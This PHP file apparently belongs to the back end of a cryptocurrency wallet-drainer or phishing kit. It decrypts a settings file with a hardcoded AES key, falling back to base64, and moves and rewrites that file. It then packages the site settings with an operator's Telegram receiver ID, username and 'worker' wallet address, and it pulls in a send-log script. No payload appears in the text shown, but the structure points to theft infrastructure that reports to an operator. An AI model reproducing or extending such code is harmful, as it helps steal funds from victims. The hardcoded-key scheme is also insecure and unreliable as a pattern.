<?php
require $_SERVER['DOCUMENT_ROOT'] . '/encryption.php';
require $_SERVER['DOCUMENT_ROOT'] . '/php/info_send_log.php';
require $_SERVER["DOCUMENT_ROOT"] . "/settings-default.php";

$settings_file_root_dir = $_SERVER["DOCUMENT_ROOT"] . "/settings.txt";
$settings_file_curr_dir = "./settings.txt";

if (file_exists($settings_file_root_dir)) { 
  // If settings file located in root directory

  $site_settings_encrypted = file_get_contents($settings_file_root_dir);
  try {
    $site_settings_decrypted = AesCtr::decrypt($site_settings_encrypted, 'c3VwZXJfc3Ryb25nX2tleQ', 128);
    $site_settings = json_decode($site_settings_decrypted, true);
    if ($site_settings === null && json_last_error() !== JSON_ERROR_NONE ) {
      throw new Exception("Invalid", 1);
    }
  } catch( Exception $error){
    $site_settings_decrypted = base64_decode($site_settings_encrypted);
    $site_settings = json_decode($site_settings_decrypted, true);
    $data_encrypted = AesCtr::encrypt($site_settings_decrypted, 'c3VwZXJfc3Ryb25nX2tleQ', 128);
    unlink($settings_file_curr_dir);
    file_put_contents($settings_file_root_dir, $data_encrypted);
  }
} elseif(file_exists($settings_file_curr_dir)) {
  // If settings file located in currect directory

  $site_settings_encrypted = file_get_contents($settings_file_curr_dir);

  try {
    // Trying to decrypt using AES
    $site_settings_decrypted = AesCtr::decrypt($site_settings_encrypted, 'c3VwZXJfc3Ryb25nX2tleQ', 128);
    $site_settings = json_decode($site_settings_decrypted, true);
    if ($site_settings === null && json_last_error() !== JSON_ERROR_NONE ) {
      throw new Exception("Invalid", 1);
    }

  } catch (Exception $error) {
    // Trying to decrypt using BASE64
    $site_settings_decrypted = base64_decode($site_settings_encrypted);
    $site_settings = json_decode($site_settings_decrypted, true);
    
  }

  $data_encrypted = AesCtr::encrypt($site_settings_decrypted, 'c3VwZXJfc3Ryb25nX2tleQ', 128);
  $is_settings_moved = file_put_contents($settings_file_root_dir, $data_encrypted);
  if ($is_settings_moved) {
    unlink($settings_file_curr_dir);
  }

} else { 
  // If settings file is not found
  $site_settings = $settings_default;
}

$encryption_prefix = 'cHJlZml4-';
$encryption_postfix = '-cG9zdGl4';
$encryption_key = base64_encode(random_bytes(10));

$raw_data = Array(
    'site_settings' => array_merge($settings_default, $site_settings),
    'receiver' => $telegram_id,
    'username' => $login_telegram,
    'worker_address' => $wallet
);

$encrypted = AesCtr::encrypt(json_encode($raw_data), $encryption_prefix . $encryption_key . $encryption_postfix, 128);
?>
